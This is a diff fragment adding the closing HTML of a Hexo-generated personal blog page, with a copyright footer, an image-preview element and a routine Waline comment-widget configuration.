+            &copy;
+            2022 - 2025 PJW&#39;S BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;PJWaurora
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+<script>
+    Waline.init({
+        el: "#waline-container",
+        serverURL: "https://commentdatabase1.vercel.app",
+        commentCount: true,
+        pageview: false,
+        emoji: "https://unpkg.com/@waline/emojis@1.2.0/weibo,https://unpkg.com/@waline/emojis@1.2.0/alus,https://unpkg.com/@waline/emojis@1.2.0/bilibili,https://unpkg.com/@waline/emojis@1.2.0/qq,https://unpkg.com/@waline/emojis@1.2.0/tieba,https://unpkg.com/@waline/emojis@1.2.0/tw-emoji".split(","),
+        meta: "nick,mail,link".split(","),
+        requiredMeta: "nick".split(","),
+        lang: "zh-CN",
+        wordLimit: 0,
+        pageSize: "10",
+        login: "enable",
+        
+    });
+</script>
+
+
+
+    
+</body>
+</html>
